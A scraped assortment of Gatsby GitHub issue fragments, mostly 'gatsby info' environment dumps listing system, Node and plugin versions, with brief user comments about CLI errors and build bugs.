``` system: os: macos 10.15.4 cpu: (4) x64 intel(r) core(tm) i5-7360u cpu @ 2.30ghz shell: 3.2.57 - /bin/bash binaries: node: 12.16.1 - /usr/local/bin/node yarn: 1.22.4 - /usr/local/bin/yarn npm: 6.13.4 - /usr/local/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 84.0.4147.89 firefox: 78.0.2 safari: 13.1 npmpackages: gatsby: 2.24.10 => 2.24.10 gatsby-image: ^2.4.7 => 2.4.13 gatsby-plugin-postcss: ^2.3.4 => 2.3.11 gatsby-plugin-purgecss: ^5.0.0 => 5.0.0 gatsby-plugin-react-leaflet: ^2.0.13 => 2.0.13 gatsby-plugin-sharp: ^2.6.12 => 2.6.21 gatsby-plugin-transition-link: ^1.20.2 => 1.20.2 gatsby-source-contentful: ^2.3.16 => 2.3.30 gatsby-source-filesystem: ^2.3.12 => 2.3.22 gatsby-source-googlemaps-static: ^1.1.12 => 1.1.12 gatsby-transformer-sharp: ^2.5.5 => 2.5.11 npmglobalpackages: gatsby-cli: 2.12.48```
system: os: macos 10.15.6 cpu: (4) x64 intel(r) core(tm) i5-7360u cpu @ 2.30ghz shell: 5.7.1 - /bin/zsh binaries: node: 12.14.0 - /usr/local/bin/node yarn: 1.22.4 - /usr/local/bin/yarn npm: 6.14.7 - /usr/local/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 84.0.4147.89 firefox: 78.0.1 safari: 13.1.2 npmpackages: gatsby: ^2.17.4 => 2.24.10 gatsby-cli: ^2.12.62 => 2.12.65 gatsby-image: ^2.2.29 => 2.4.13 gatsby-plugin-google-analytics: ^2.0.13 => 2.3.13 gatsby-plugin-layout: ^1.0.11 => 1.3.10 gatsby-plugin-manifest: ^2.2.23 => 2.4.20 gatsby-plugin-offline: ^3.0.16 => 3.2.20 gatsby-plugin-react-helmet: ^3.1.13 => 3.3.10 gatsby-plugin-root-import: ^2.0.5 => 2.0.5 gatsby-plugin-sharp: ^2.2.32 => 2.6.21 gatsby-plugin-styled-components: ^3.3.10 => 3.3.10 gatsby-plugin-transition-link: ^1.20.2 => 1.20.2 gatsby-plugin-web-font-loader: ^1.0.4 => 1.0.4 gatsby-source-filesystem: ^2.1.33 => 2.3.22 gatsby-source-graphql: ^2.6.2 => 2.6.2 gatsby-source-shopify: ^3.2.24 => 3.2.24 gatsby-transformer-sharp: ^2.3.0 => 2.5.11 npmglobalpackages: gatsby-cli: 2.12.60
2019 macbook pro
macos catalina 10.15.6 is there another way to completely remove the gatsby-cli from my system, so that i may reinstall it? thanks in advance!
system: os: macos 10.15.6 cpu: (4) x64 intel(r) core(tm) i5-7360u cpu @ 2.30ghz shell: 5.7.1 - /bin/zsh binaries: node: 12.14.0 - /usr/local/bin/node yarn: 1.22.4 - /usr/local/bin/yarn npm: 6.14.7 - /usr/local/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 84.0.4147.89 firefox: 78.0.1 safari: 13.1.2 npmpackages: gatsby: ^2.17.4 => 2.24.4 gatsby-cli: ^2.12.62 => 2.12.62 gatsby-image: ^2.2.29 => 2.4.13 gatsby-plugin-google-analytics: ^2.0.13 => 2.3.11 gatsby-plugin-layout: ^1.0.11 => 1.3.10 gatsby-plugin-manifest: ^2.2.23 => 2.4.18 gatsby-plugin-offline: ^3.0.16 => 3.2.18 gatsby-plugin-react-helmet: ^3.1.13 => 3.3.10 gatsby-plugin-root-import: ^2.0.5 => 2.0.5 gatsby-plugin-sharp: ^2.2.32 => 2.6.19 gatsby-plugin-styled-components: ^3.3.10 => 3.3.10 gatsby-plugin-transition-link: ^1.20.2 => 1.20.2 gatsby-plugin-web-font-loader: ^1.0.4 => 1.0.4 gatsby-source-filesystem: ^2.1.33 => 2.3.20 gatsby-source-shopify: ^3.2.24 => 3.2.24 gatsby-source-shopify2: ^2.0.7 => 2.0.7 gatsby-transformer-sharp: ^2.3.0 => 2.5.11 npmglobalpackages: gatsby-cli: 2.12.60
system: os: linux 5.3 pop!_os 19.10 cpu: (4) x64 intel(r) core(tm) i7-6600u cpu @ 2.60ghz shell: 5.0.3 - /bin/bash binaries: node: 13.14.0 - /usr/bin/node npm: 6.14.5 - /usr/bin/npm languages: python: 2.7.17 - /usr/bin/python browsers: chrome: 83.0.4103.116 firefox: 73.0.1 npmpackages: gatsby: ^2.23.12 => 2.23.12 gatsby-image: ^2.4.13 => 2.4.13 gatsby-plugin-feed-mdx: ^1.0.1 => 1.0.1 gatsby-plugin-google-analytics: ^2.3.6 => 2.3.6 gatsby-plugin-manifest: ^2.4.14 => 2.4.14 gatsby-plugin-mdx: ^1.2.27 => 1.2.27 gatsby-plugin-offline: ^3.2.13 => 3.2.13 gatsby-plugin-preload-fonts: ^1.2.18 => 1.2.18 gatsby-plugin-react-helmet: ^3.3.6 => 3.3.6 gatsby-plugin-remove-trailing-slashes: ^2.3.11 => 2.3.11 gatsby-plugin-sass: ^2.3.12 => 2.3.12 gatsby-plugin-sharp: ^2.6.19 => 2.6.19 gatsby-plugin-typography: ^2.5.6 => 2.5.6 gatsby-remark-copy-linked-files: ^2.3.7 => 2.3.7 gatsby-remark-images: ^3.3.14 => 3.3.14 gatsby-remark-responsive-iframe: ^2.4.7 => 2.4.7 gatsby-remark-smartypants: ^2.3.6 => 2.3.6 gatsby-source-filesystem: ^2.3.14 => 2.3.14 gatsby-transformer-sharp: ^2.5.11 => 2.5.11 npmglobalpackages: gatsby-cli: 2.12.60
> _womp womp_ ```shell
% gatsby info --clipboard error unhandled rejection e.filter is not a function typeerror: e.filter is not a function - envinfo.js:1 [lib]/[gatsby-cli]/[envinfo]/dist/envinfo.js:1:73205 - async promise.all
``` system: os: macos mojave 10.14.6 cpu: (12) x64 intel(r) core(tm) i9-8950hk cpu @ 2.90ghz shell: 3.2.57 - /bin/sh binaries: node: 12.16.3 - ~/.nvm/versions/node/v12.16.3/bin/node yarn: 1.22.4 - /usr/local/bin/yarn npm: 6.14.4 - ~/.nvm/versions/node/v12.16.3/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 84.0.4147.89 firefox: 78.0.2 safari: 13.1.2 npmpackages: gatsby: ^2.23.1 => 2.23.1 gatsby-cli: ^2.12.44 => 2.12.44 gatsby-image: ^2.4.7 => 2.4.7 gatsby-link: ^2.4.6 => 2.4.6 gatsby-plugin-catch-links: ^2.3.5 => 2.3.5 gatsby-plugin-favicon: ^3.1.6 => 3.1.6 gatsby-plugin-google-tagmanager: ^2.3.5 => 2.3.5 gatsby-plugin-manifest: ^2.4.11 => 2.4.11 gatsby-plugin-netlify-cms: ^4.3.7 => 4.3.7 gatsby-plugin-node-fields: 3.1.0 => 3.1.0 gatsby-plugin-page-creator: ^2.3.9 => 2.3.9 gatsby-plugin-react-helmet: ^3.3.4 => 3.3.4 gatsby-plugin-react-helmet-canonical-urls: ^1.4.0 => 1.4.0 gatsby-plugin-scroll-reveal: ^0.0.7 => 0.0.7 gatsby-plugin-sharp: ^2.6.11 => 2.6.11 gatsby-plugin-sitemap: ^2.4.5 => 2.4.5 gatsby-plugin-styled-components: ^3.3.4 => 3.3.4 gatsby-plugin-svgr: ^2.0.2 => 2.0.2 gatsby-react-router-scroll: 3.0.3 => 3.0.3 gatsby-remark-autolink-headers: ^2.3.5 => 2.3.5 gatsby-remark-component-parent2div: ^1.2.3 => 1.2.3 gatsby-remark-copy-linked-files: ^2.3.5 => 2.3.5 gatsby-remark-footnotes: ^0.0.7 => 0.0.7 gatsby-remark-images: ^3.3.10 => 3.3.10 gatsby-remark-numbered-footnotes: ^1.0.1 => 1.0.1 gatsby-remark-relative-images: ^0.3.0 => 0.3.0 gatsby-remark-responsive-iframe: ^2.4.5 => 2.4.5 gatsby-remark-smartypants: ^2.3.4 => 2.3.4 gatsby-remark-unwrap-images: ^1.0.2 => 1.0.2 gatsby-source-filesystem: ^2.3.11 => 2.3.11 gatsby-transformer-json: ^2.4.5 => 2.4.5 gatsby-transformer-remark: ^2.8.15 => 2.8.15 gatsby-transformer-sharp: ^2.5.5 => 2.5.5
system: os: windows 10 10.0.18363 cpu: (4) x64 intel(r) core(tm) i5-4590 cpu @ 3.30ghz binaries: node: 12.16.3 - c:\\program files\ odejs\ ode.exe npm: 6.14.4 - c:\\program files\ odejs\ pm.cmd browsers: edge: 44.18362.449.0 npmpackages: gatsby: ^2.20.36 => 2.24.9 gatsby-plugin-google-analytics: ^2.1.8 => 2.3.13 gatsby-plugin-manifest: ^2.2.6 => 2.4.20 gatsby-plugin-netlify: ^2.1.6 => 2.3.11 gatsby-plugin-offline: ^2.2.7 => 2.2.10 gatsby-plugin-webpack-bundle-analyser-v2: ^1.1.10 => 1.1.10 npmglobalpackages: gatsby-cli: 2.12.62
it only happens on production environments this was first reported in #16763 but since that issue was closed and is being ignored, i'm opening a new one refering to the same bug.
this happens for all github users.
system: os: linux 5.7 arch linux cpu: (12) x64 intel(r) xeon(r) e-2176m cpu @ 2.70ghz shell: 5.0.17 - /bin/bash binaries: node: 14.5.0 - /sbin/node yarn: 1.22.4 - /sbin/yarn npm: 6.14.6 - /sbin/npm languages: python: 3.8.3 - /sbin/python
system: os: macos 10.15.5 cpu: (8) x64 intel(r) core(tm) i7-4870hq cpu @ 2.50ghz shell: 3.2.57 - /bin/bash binaries: node: 10.16.3 - /usr/local/bin/node yarn: 1.21.1 - /usr/local/bin/yarn npm: 6.13.6 - /usr/local/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 84.0.4147.89 firefox: 78.0.2 safari: 13.1.1 npmpackages: gatsby: ^2.22.15 => 2.24.7 gatsby-image: ^2.4.5 => 2.4.13 gatsby-plugin-manifest: ^2.4.9 => 2.4.19 gatsby-plugin-offline: ^3.2.7 => 3.2.19 gatsby-plugin-react-helmet: ^3.3.2 => 3.3.10 gatsby-plugin-sharp: ^2.6.9 => 2.6.20 gatsby-source-airtable: ^2.1.1 => 2.1.1 gatsby-source-filesystem: ^2.3.8 => 2.3.20 gatsby-source-googlemaps-geocoding: ^1.0.0 => 1.0.0 gatsby-source-googlemaps-static: ^1.1.12 => 1.1.12 gatsby-transformer-csv: ^2.3.10 => 2.3.10 gatsby-transformer-sharp: ^2.5.3 => 2.5.11 npmglobalpackages: gatsby-cli: 2.8.12
as mentioned above running version `gatsby@2.23.5` also tried `gatsby@2.23.19` as i was seeing a different error related to this issue #25481 ``` system: os: macos 10.15.2 cpu: (4) x64 intel(r) core(tm) i5-7360u cpu @ 2.30ghz shell: 5.7.1 - /bin/zsh binaries: node: 10.16.3 - ~/.nvm/versions/node/v10.16.3/bin/node yarn: 1.22.4 - ~/.yarn/bin/yarn npm: 6.9.0 - ~/.nvm/versions/node/v10.16.3/bin/npm languages: python: 2.7.14 - /library/frameworks/python.framework/versions/2.7/bin/python browsers: chrome: 84.0.4147.89 firefox: 78.0.2 safari: 13.0.4 npmglobalpackages: gatsby-cli: 2.12.43
`gatsby build --prefix-paths`
system: os: macos 10.15.6 cpu: (8) x64 intel(r) core(tm) i7-4870hq cpu @ 2.50ghz shell: 5.7.1 - /bin/zsh binaries: node: 14.5.0 - ~/.nvm/versions/node/v14.5.0/bin/node yarn: 1.22.0 - /usr/local/bin/yarn npm: 6.14.5 - ~/.nvm/versions/node/v14.5.0/bin/npm languages: python: 2.7.15 - /usr/local/bin/python browsers: chrome: 84.0.4147.89 edge: 81.0.416.53 firefox: 78.0.2 safari: 13.1.2 npmpackages: gatsby: 2.24.7 => 2.24.7 gatsby-plugin-create-client-paths: 2.3.10 => 2.3.10 gatsby-plugin-mdx: 1.2.27 => 1.2.27 gatsby-plugin-postcss: 2.3.11 => 2.3.11 gatsby-plugin-react-helmet: 3.3.10 => 3.3.10
``` system: os: macos 10.15.5 cpu: (4) x64 intel(r) core(tm) i7-7567u cpu @ 3.50ghz shell: 5.7.1 - /bin/zsh binaries: node: 14.4.0 - /var/folders/mt/71kkzssd3fq24s3x3y6wpc4h0000gn/t/yarn--1595324137736-0.6757048113533806/node yarn: 1.22.4 - /var/folders/mt/71kkzssd3fq24s3x3y6wpc4h0000gn/t/yarn--1595324137736-0.6757048113533806/yarn npm: 6.14.5 - /usr/local/bin/npm languages: python: 2.7.16 - /usr/local/bin/python browsers: chrome: 84.0.4147.89 firefox: 72.0.2 safari: 13.1.1 ``` thanks in advance!
``` system: os: macos 10.15.4 cpu: (12) x64 intel(r) core(tm) i7-9750h cpu @ 2.60ghz shell: 3.2.57 - /bin/bash binaries: node: 12.6.0 - ~/.nvm/versions/node/v12.6.0/bin/node yarn: 1.22.4 - ~/.yarn/bin/yarn npm: 6.14.6 - ~/.nvm/versions/node/v12.6.0/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 84.0.4147.89 firefox: 78.0.2 safari: 13.1
``` system: os: macos 10.15.6 cpu: (8) x64 intel(r) core(tm) i7-4960hq cpu @ 2.60ghz shell: 5.7.1 - /bin/zsh binaries: node: 14.5.0 - /usr/local/bin/node yarn: 1.22.4 - /usr/local/bin/yarn npm: 6.14.5 - /usr/local/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 84.0.4147.89 firefox: 78.0.2 safari: 13.1.2 npmpackages: gatsby: ^2.24.7 => 2.24.7 gatsby-background-image: ^1.1.1 => 1.1.1 gatsby-cli: ^2.12.63 => 2.12.63 gatsby-image: ^2.4.13 => 2.4.13 gatsby-plugin-canonical-urls: ^2.3.10 => 2.3.10 gatsby-plugin-catch-links: ^2.3.11 => 2.3.11 gatsby-plugin-google-analytics: ^2.3.12 => 2.3.12 gatsby-plugin-intl: ^0.3.3 => 0.3.3 gatsby-plugin-manifest: ^2.4.19 => 2.4.19 gatsby-plugin-material-ui: ^2.1.9 => 2.1.9 gatsby-plugin-offline: ^3.2.19 => 3.2.19 gatsby-plugin-react-helmet: ^3.3.10 => 3.3.10 gatsby-plugin-remove-generator: ^1.0.5 => 1.0.5 gatsby-plugin-sass: ^2.3.12 => 2.3.12 gatsby-plugin-sharp: ^2.6.20 => 2.6.20 gatsby-plugin-styled-components: ^3.3.10 => 3.3.10 gatsby-source-filesystem: ^2.3.20 => 2.3.20 gatsby-transformer-sharp: ^2.5.11 => 2.5.11 npmglobalpackages: gatsby-cli: 2.12.63
system: os: windows 10 cpu: (12) x64 intel(r) xeon(r) cpu e5-1650 v4 @ 3.60ghz binaries: yarn: 1.21.0 - c:\\users\\apa\\appdata\ oaming\ pm\\yarn.cmd npm: 6.14.4 - c:\\program files\ odejs\ pm.cmd languages: python: 3.8.3 - /c/python38/python browsers: edge: 44.17763.831.0 npmpackages: gatsby: 2.24.2 => 2.24.2 gatsby-graphiql-explorer: ^0.2.31 => 0.2.31 gatsby-plugin-react-decorators: 0.0.4 => 0.0.4 gatsby-plugin-react-helmet: ^3.1.18 => 3.1.18 gatsby-plugin-sass: ^2.1.26 => 2.1.26 gatsby-plugin-sharp: ^2.3.9 => 2.3.9 gatsby-plugin-typescript: ^2.1.23 => 2.1.23 gatsby-source-contentful: ^2.3.15 => 2.3.15 gatsby-source-filesystem: ^2.1.42 => 2.1.42 gatsby-transformer-json: ^2.2.22 => 2.2.22 gatsby-transformer-sharp: ^2.3.9 => 2.3.9
```txt system: os: linux 4.19 debian gnu/linux 10 (buster) 10 (buster) cpu: (12) x64 intel(r) core(tm) i7-8850h cpu @ 2.60ghz shell: 5.0.3 - /bin/bash binaries: node: 12.16.3 - /usr/local/bin/node yarn: 1.22.4 - /usr/bin/yarn npm: 6.14.4 - /usr/local/bin/npm languages: python: 2.7.16 - /usr/bin/python npmpackages: gatsby: ^2.24.4 => 2.24.4 gatsby-image: ^2.4.13 => 2.4.13 gatsby-plugin-google-gtag: ^2.1.10 => 2.1.10 gatsby-plugin-manifest: ^2.4.18 => 2.4.18 gatsby-plugin-netlify: ^2.3.11 => 2.3.11 gatsby-plugin-react-helmet: ^3.3.10 => 3.3.10 gatsby-plugin-sharp: ^2.6.19 => 2.6.19 gatsby-plugin-theme-ui: ^0.3.0 => 0.3.0 gatsby-source-sanity: ^6.0.3 => 6.0.3 gatsby-theme-style-guide: ^0.3.1 => 0.3.1 gatsby-transformer-sharp: ^2.5.11 => 2.5.11 npmglobalpackages: gatsby-cli: 2.12.45
system: os: windows 10 10.0.20161 cpu: (4) x64 intel(r) core(tm) i5-2500 cpu @ 3.30ghz binaries: node: 12.14.1 - c:\\program files\ odejs\ ode.exe yarn: 1.19.2 - c:\\program files (x86)\\yarn\\bin\\yarn.cmd npm: 6.13.6 - ~\\appdata\ oaming\ pm\ pm.cmd languages: python: 3.7.4 browsers: edge: 44.20170.1000.0 npmglobalpackages: gatsby-cli: 2.12.60 terminal/cmd line used - windows terminal (version: 1.0.1811.0)
powershell - version 5.1
system: os: macos mojave 10.14.6 cpu: (16) x64 intel(r) core(tm) i9-9880h cpu @ 2.30ghz shell: 5.3 - /bin/zsh binaries: node: 12.18.0 - ~/.nvm/versions/node/v12.18.0/bin/node yarn: 1.22.4 - /usr/local/bin/yarn npm: 6.14.4 - ~/.nvm/versions/node/v12.18.0/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 84.0.4147.89 safari: 13.1.2 npmpackages: gatsby: 2.24.3 => 2.24.3 gatsby-background-image: ^1.1.1 => 1.1.1 gatsby-image: ~2.4.12 => 2.4.12 gatsby-plugin-catch-links: ~2.3.10 => 2.3.10 gatsby-plugin-emotion: ~2.0.5 => 2.0.7 gatsby-plugin-favicon: ~3.1.5 => 3.1.6 gatsby-plugin-google-gtag: ~2.1.9 => 2.1.9 gatsby-plugin-manifest: ~2.4.17 => 2.4.17 gatsby-plugin-mdx: ^1.2.22 => 1.2.22 gatsby-plugin-postcss: ~2.3.9 => 2.3.9 gatsby-plugin-react-helmet: ~3.3.9 => 3.3.9 gatsby-plugin-remove-generator: ^1.0.5 => 1.0.5 gatsby-plugin-remove-serviceworker: ^1.0.0 => 1.0.0 gatsby-plugin-robots-txt: ~1.5.1 => 1.5.1 gatsby-plugin-root-import: ~2.0.5 => 2.0.5 gatsby-plugin-sharp: ~2.6.18 => 2.6.18 gatsby-plugin-sitemap: ~2.4.10 => 2.4.10 gatsby-remark-autolink-headers: ^2.3.10 => 2.3.10 gatsby-remark-copy-linked-files: ^2.3.10 => 2.3.10 gatsby-remark-external-links: ~0.0.4 => 0.0.4 gatsby-remark-images: ~3.3.17 => 3.3.17 gatsby-remark-relative-images: ^0.2.2 => 0.2.3 gatsby-remark-responsive-iframe: ~2.4.10 => 2.4.10 gatsby-source-filesystem: ~2.3.18 => 2.3.18 gatsby-source-youtube-v2: ^1.0.1 => 1.0.1 gatsby-transformer-remark: ^2.8.23 => 2.8.23 gatsby-transformer-sharp: ~2.5.10 => 2.5.10 npmglobalpackages: gatsby-cli: 2.12.59
observable on the live site and on github
**gatsby-starter-blog:** system: os: linux 5.3 ubuntu 18.04.4 lts (bionic beaver) cpu: (4) x64 intel(r) core(tm) i7-8650u cpu @ 1.90ghz shell: 4.4.20 - /bin/bash binaries: node: 12.18.0 - /usr/bin/node npm: 6.9.0 - /usr/bin/npm languages: python: 2.7.17 - /usr/bin/python browsers: chrome: 83.0.4103.61 firefox: 76.0.1 npmpackages: gatsby: ^2.22.15 => 2.22.15 gatsby-image: ^2.4.5 => 2.4.5 gatsby-plugin-catch-links: ^2.3.3 => 2.3.3 gatsby-plugin-feed: ^2.5.3 => 2.5.3 gatsby-plugin-google-analytics: ^2.3.2 => 2.3.2 gatsby-plugin-lodash: ^3.3.2 => 3.3.2 gatsby-plugin-manifest: ^2.4.9 => 2.4.9 gatsby-plugin-netlify-cms: ^4.3.3 => 4.3.3 gatsby-plugin-nprogress: ^2.3.2 => 2.3.2 gatsby-plugin-offline: ^3.2.7 => 3.2.7 gatsby-plugin-react-helmet: ^3.3.2 => 3.3.2 gatsby-plugin-sharp: ^2.6.9 => 2.6.9 gatsby-plugin-sitemap: ^2.4.3 => 2.4.3 gatsby-plugin-twitter: ^2.3.2 => 2.3.2 gatsby-remark-autolink-headers: ^2.3.3 => 2.3.3 gatsby-remark-copy-linked-files: ^2.3.3 => 2.3.3 gatsby-remark-images: ^3.3.8 => 3.3.8 gatsby-remark-prismjs: ^3.5.2 => 3.5.2 gatsby-remark-relative-images: ^0.3.0 => 0.3.0 gatsby-remark-responsive-iframe: ^2.4.3 => 2.4.3 gatsby-source-filesystem: ^2.3.8 => 2.3.8 gatsby-transformer-remark: ^2.8.13 => 2.8.13 gatsby-transformer-sharp: ^2.5.3 => 2.5.3 npmglobalpackages: gatsby-cli: 2.12.61 **gatsby-advanced-starter:** system: os: linux 5.3 ubuntu 18.04.4 lts (bionic beaver) cpu: (4) x64 intel(r) core(tm) i7-8650u cpu @ 1.90ghz shell: 4.4.20 - /bin/bash binaries: node: 12.18.0 - /usr/bin/node npm: 6.9.0 - /usr/bin/npm languages: python: 2.7.17 - /usr/bin/python browsers: chrome: 83.0.4103.61 firefox: 76.0.1 npmpackages: gatsby: ^2.22.15 => 2.22.15 gatsby-image: ^2.4.5 => 2.4.5 gatsby-plugin-catch-links: ^2.3.3 => 2.3.3 gatsby-plugin-feed: ^2.5.3 => 2.5.3 gatsby-plugin-google-analytics: ^2.3.2 => 2.3.2 gatsby-plugin-lodash: ^3.3.2 => 3.3.2 gatsby-plugin-manifest: ^2.4.9 => 2.4.9 gatsby-plugin-netlify-cms: ^4.3.3 => 4.3.3 gatsby-plugin-nprogress: ^2.3.2 => 2.3.2 gatsby-plugin-offline: ^3.2.7 => 3.2.7 gatsby-plugin-react-helmet: ^3.3.2 => 3.3.2 gatsby-plugin-sharp: ^2.6.9 => 2.6.9 gatsby-plugin-sitemap: ^2.4.3 => 2.4.3 gatsby-plugin-twitter: ^2.3.2 => 2.3.2 gatsby-remark-autolink-headers: ^2.3.3 => 2.3.3 gatsby-remark-copy-linked-files: ^2.3.3 => 2.3.3 gatsby-remark-images: ^3.3.8 => 3.3.8 gatsby-remark-prismjs: ^3.5.2 => 3.5.2 gatsby-remark-relative-images: ^0.3.0 => 0.3.0 gatsby-remark-responsive-iframe: ^2.4.3 => 2.4.3 gatsby-source-filesystem: ^2.3.8 => 2.3.8 gatsby-transformer-remark: ^2.8.13 => 2.8.13 gatsby-transformer-sharp: ^2.5.3 => 2.5.3 npmglobalpackages: gatsby-cli: 2.12.61 **abother try after uplift of gatsby to latest version:** system: os: linux 5.3 ubuntu 18.04.4 lts (bionic beaver) cpu: (4) x64 intel(r) core(tm) i7-8650u cpu @ 1.90ghz shell: 4.4.20 - /bin/bash binaries: node: 12.18.0 - /usr/bin/node npm: 6.9.0 - /usr/bin/npm languages: python: 2.7.17 - /usr/bin/python browsers: chrome: 83.0.4103.61 firefox: 76.0.1 npmpackages: gatsby: ^2.24.3 => 2.24.3 gatsby-image: ^2.4.5 => 2.4.5 gatsby-plugin-catch-links: ^2.3.3 => 2.3.3 gatsby-plugin-feed: ^2.5.3 => 2.5.3 gatsby-plugin-google-analytics: ^2.3.2 => 2.3.2 gatsby-plugin-lodash: ^3.3.2 => 3.3.2 gatsby-plugin-manifest: ^2.4.9 => 2.4.9 gatsby-plugin-netlify-cms: ^4.3.3 => 4.3.3 gatsby-plugin-nprogress: ^2.3.2 => 2.3.2 gatsby-plugin-offline: ^3.2.7 => 3.2.7 gatsby-plugin-react-helmet: ^3.3.2 => 3.3.2 gatsby-plugin-sharp: ^2.6.9 => 2.6.9 gatsby-plugin-sitemap: ^2.4.3 => 2.4.3 gatsby-plugin-twitter: ^2.3.2 => 2.3.2 gatsby-remark-autolink-headers: ^2.3.3 => 2.3.3 gatsby-remark-copy-linked-files: ^2.3.3 => 2.3.3 gatsby-remark-images: ^3.3.8 => 3.3.8 gatsby-remark-prismjs: ^3.5.2 => 3.5.2 gatsby-remark-relative-images: ^0.3.0 => 0.3.0 gatsby-remark-responsive-iframe: ^2.4.3 => 2.4.3 gatsby-source-filesystem: ^2.3.8 => 2.3.8 gatsby-transformer-remark: ^2.8.13 => 2.8.13 gatsby-transformer-sharp: ^2.5.3 => 2.5.3 npmglobalpackages: gatsby-cli: 2.12.61
(chrome on mac)
system: os: windows 10 10.0.19041 cpu: (6) x64 intel(r) core(tm) i5-8400 cpu @ 2.80ghz binaries: node: 12.18.1 - c:\\program files\ odejs\ ode.exe npm: 6.14.5 - c:\\program files\ odejs\ pm.cmd browsers: edge: 44.19041.1.0 npmpackages: gatsby: ^2.23.12 => 2.23.12 gatsby-image: ^2.4.9 => 2.4.9 gatsby-plugin-manifest: ^2.4.14 => 2.4.14 gatsby-plugin-offline: ^3.2.13 => 3.2.13 gatsby-plugin-react-helmet: ^3.3.6 => 3.3.6 gatsby-plugin-sharp: ^2.6.14 => 2.6.14 gatsby-source-filesystem: ^2.3.14 => 2.3.14 gatsby-transformer-sharp: ^2.5.7 => 2.5.7 npmglobalpackages: gatsby-cli: 2.12.61
system: os: windows 10 10.0.19041 cpu: (4) x64 intel(r) core(tm) i7-5500u cpu @ 2.40ghz binaries: node: 12.16.3 - c:\\program files\ odejs\ ode.exe yarn: 1.16.0 - c:\\program files (x86)\\yarn\\bin\\yarn.cmd npm: 6.14.4 - c:\\program files\ odejs\ pm.cmd languages: python: 2.7.11 - c:\\python27\\python.exe browsers: edge: 44.19041.1.0 npmpackages: gatsby: ^2.24.3 => 2.24.3 gatsby-image: ^2.4.13 => 2.4.13 gatsby-plugin-manifest: ^2.4.18 => 2.4.18 gatsby-plugin-offline: ^3.2.18 => 3.2.18 gatsby-plugin-react-helmet: ^3.3.10 => 3.3.10 gatsby-plugin-sharp: ^2.6.19 => 2.6.19 gatsby-source-filesystem: ^2.3.19 => 2.3.19 gatsby-transformer-sharp: ^2.5.11 => 2.5.11
system: os: linux 4.4 ubuntu 16.04.6 lts (xenial xerus) cpu: (4) x64 intel(r) core(tm) i5-6200u cpu @ 2.30ghz shell: 4.3.48 - /bin/bash binaries: node: 14.2.0 - /tmp/yarn--1594813578561-0.30698502797906935/node yarn: 1.21.1 - /tmp/yarn--1594813578561-0.30698502797906935/yarn npm: 6.14.4 - ~/.nvm/versions/node/v14.2.0/bin/npm languages: python: 2.7.12 - /usr/bin/python browsers: chrome: 81.0.4044.138 firefox: 72.0.2 npmpackages: gatsby: ^2.17.6 => 2.24.2 gatsby-image: ^2.2.30 => 2.4.13 gatsby-plugin-manifest: ^2.2.25 => 2.4.18 gatsby-plugin-offline: ^3.0.17 => 3.2.17 gatsby-plugin-react-helmet: ^3.1.13 => 3.3.10 gatsby-plugin-react-native-web: ^3.0.0-beta.1 => 3.1.0 gatsby-plugin-sharp: ^2.2.34 => 2.6.19 gatsby-plugin-typescript: ^2.1.15 => 2.4.14 gatsby-plugin-webpack-bundle-analyzer: ^1.0.5 => 1.0.5 gatsby-source-filesystem: ^2.1.35 => 2.3.19 gatsby-transformer-sharp: ^2.3.1 => 2.5.11
- internet exploler 11.1339.17763.0
- windows 10 enterprise evaluation (version 1809)
- running with virtualbox image downloaded from:
- `$ gatsby info` ``` system: os: macos 10.15.5 cpu: (16) x64 intel(r) core(tm) i9-9980hk cpu @ 2.40ghz shell: 5.7.1 - /bin/zsh binaries: node: 12.14.0 - /var/folders/41/sk7nqvy57y906b5fx50bddj00000gn/t/yarn--1594785359673-0.6413617726071603/node yarn: 1.22.4 - /var/folders/41/sk7nqvy57y906b5fx50bddj00000gn/t/yarn--1594785359673-0.6413617726071603/yarn npm: 6.13.4 - ~/.anyenv/envs/nodenv/versions/12.14.0/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 83.0.4103.116 firefox: 77.0.1 safari: 13.1.1 npmpackages: gatsby: ^2.24.2 => 2.24.2 gatsby-image: ^2.4.13 => 2.4.13 gatsby-plugin-manifest: ^2.4.18 => 2.4.18 gatsby-plugin-offline: ^3.2.17 => 3.2.17 gatsby-plugin-react-helmet: ^3.3.10 => 3.3.10 gatsby-plugin-sharp: ^2.6.19 => 2.6.19 gatsby-source-filesystem: ^2.3.19 => 2.3.19 gatsby-transformer-sharp: ^2.5.11 => 2.5.11 ```
system: os: macos mojave 10.14.6 cpu: (16) x64 intel(r) core(tm) i9-9880h cpu @ 2.30ghz shell: 5.3 - /bin/zsh binaries: node: 12.18.0 - ~/.nvm/versions/node/v12.18.0/bin/node yarn: 1.22.4 - /usr/local/bin/yarn npm: 6.14.4 - ~/.nvm/versions/node/v12.18.0/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 83.0.4103.116 safari: 13.1.1 npmpackages: gatsby: ~2.24.2 => 2.24.2 gatsby-background-image: ^1.1.1 => 1.1.1 gatsby-image: ~2.4.12 => 2.4.12 gatsby-plugin-catch-links: ~2.3.10 => 2.3.10 gatsby-plugin-emotion: ~2.0.5 => 2.0.7 gatsby-plugin-favicon: ~3.1.5 => 3.1.6 gatsby-plugin-google-gtag: ~2.1.9 => 2.1.9 gatsby-plugin-manifest: ~2.4.17 => 2.4.17 gatsby-plugin-mdx: ^1.2.22 => 1.2.22 gatsby-plugin-postcss: ~2.3.9 => 2.3.9 gatsby-plugin-react-helmet: ~3.3.9 => 3.3.9 gatsby-plugin-remove-generator: ^1.0.5 => 1.0.5 gatsby-plugin-remove-serviceworker: ^1.0.0 => 1.0.0 gatsby-plugin-robots-txt: ~1.5.1 => 1.5.1 gatsby-plugin-root-import: ~2.0.5 => 2.0.5 gatsby-plugin-sharp: ~2.6.18 => 2.6.18 gatsby-plugin-sitemap: ~2.4.10 => 2.4.10 gatsby-remark-autolink-headers: ^2.3.10 => 2.3.10 gatsby-remark-copy-linked-files: ^2.3.10 => 2.3.10 gatsby-remark-external-links: ~0.0.4 => 0.0.4 gatsby-remark-images: ~3.3.17 => 3.3.17 gatsby-remark-relative-images: ^0.2.2 => 0.2.3 